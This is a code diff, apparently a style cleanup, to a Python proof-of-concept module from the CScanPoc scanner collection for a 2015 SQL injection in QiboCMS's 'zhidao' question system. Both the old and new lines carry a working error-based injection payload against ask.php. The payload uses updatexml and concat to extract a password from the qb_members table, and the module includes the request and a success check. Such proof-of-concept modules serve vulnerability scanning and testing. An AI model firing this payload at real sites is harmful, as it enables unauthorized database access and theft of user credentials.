@@ -3,11 +3,12 @@
 from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
+
 class Vuln(ABVuln):
-    vuln_id = 'QiboCMS_0013' # 平台漏洞编号，留空
+    vuln_id = 'QiboCMS_0013'  # 平台漏洞编号，留空
     name = 'QiboCMS知道系统 SQL注入'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = '2015-06-26'  # 漏洞公布时间
     desc = '''
         齐博CMS 知道系统，页面参数过滤不严，导致SQL注入。
@@ -17,6 +18,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = 'QiboCMS(齐博CMS)'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = 'c81399bb-9564-4278-9d73-a8a8bc17bd2f'
@@ -30,14 +32,14 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
-            #refer:http://www.wooyun.org/bugs/wooyun-2015-0122606
-            payload="/zhidao/ask.php?step=4&fiddb[]=1)%20and%20updatexml(1,concat(0x5e24,(select%20concat(md5(1234),password)%20from%20qb_members%20limit%201),0x5e24),1)%23&title=wwwwwwww"
+
+            # refer:http://www.wooyun.org/bugs/wooyun-2015-0122606
+            payload = "/zhidao/ask.php?step=4&fiddb[]=1)%20and%20updatexml(1,concat(0x5e24,(select%20concat(md5(1234),password)%20from%20qb_members%20limit%201),0x5e24),1)%23&title=wwwwwwww"
             verify_url = self.target + payload
             r = requests.get(verify_url)
 
             if r.status_code == 200 and "81dc9bdb52d04dc20036dbd8313ed0" in r.content:
-                #security_hole(url2)
+                # security_hole(url2)
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
 
@@ -46,6 +48,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
